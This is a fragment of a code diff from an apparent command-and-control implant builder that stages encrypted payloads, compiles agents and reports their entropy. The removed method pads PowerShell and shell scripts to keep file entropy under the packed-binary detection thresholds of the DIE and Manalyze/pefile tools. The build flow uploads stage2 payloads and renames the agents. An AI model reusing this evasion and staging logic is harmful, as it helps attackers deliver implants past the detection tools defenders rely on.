             for r in renamed:
                 ok(r)
 
-    def _step_pad_scripts(self, agent_dir: Path) -> None:
-        """Append low-entropy padding to generated scripts to lower overall file entropy.
-
-        Target H ≤ 5.0 so that when the script is embedded in a PE/ELF .rdata/.rodata
-        section alongside other read-only strings the section stays ≤ 5.5 b/B,
-        well below the 6.5 b/B threshold used by DIE and the 7.0 b/B threshold
-        used by Manalyze/pefile for per-section packed-binary detection.
-        """
-        self._step("Entropy balancing  (scripts → .rdata/.rodata target ≤ 5.5 b/B)")
-        ext_map = {".ps1": "ps1", ".sh": "sh"}
-        results = []
-        for p in sorted(agent_dir.iterdir()):
-            if p.suffix not in ext_map:
-                continue
-            H_before = _entropy(p.read_bytes())
-            H_after = _pad_script_entropy(p, target=5.0, mode=ext_map[p.suffix])
-            results.append((p.name, H_before, H_after))
-        if not results:
-            info("No scripts found")
-            return
-        for name, h_before, h_after in results:
-            if h_after < h_before - 0.05:
-                ok(f"{name}: {h_before:.2f} → {h_after:.2f} b/B  (padded)")
-            else:
-                info(f"{name}: {h_before:.2f} b/B  (within target)")
+    # Script entropy padding removed — Rust binaries are compiled natively
+    # and don't embed script payloads that would inflate section entropy.
 
     def _step_entropy_table(self, agent_dir: Path) -> None:
         """Display a per-artifact Shannon entropy table after compilation."""
@@ -1806,22 +1388,10 @@ class ProviderWizard(ABC):
             self.step_init_channel(cfg)
 
             _check_cancelled()
-            if cfg.mode == "staged-enc":
-                self.step_upload_stage2(cfg, agent_dir, pub_pem)
-                _check_cancelled()
-                self._step_generate_stubs(cfg, agent_dir, pub_pem)
-            elif cfg.mode == "stageless-enc":
-                self.step_upload_stageless_enc(cfg, agent_dir, pub_pem)
-            elif cfg.mode == "stageless-plain":
-                self._step_generate_agents_plain(cfg, agent_dir, pub_pem)
-
-            _check_cancelled()
-            self._step_pad_scripts(agent_dir)
-            _check_cancelled()
             self._step_compile_artifacts(cfg, agent_dir, pub_pem)
             _check_cancelled()
             if cfg.mode == "staged-enc":
-                self.step_upload_stage2_win(cfg, agent_dir)
+                self.step_upload_stage2(cfg, agent_dir)
             self._step_rename_agents(cfg, agent_dir)
             self._step_entropy_table(agent_dir)
 
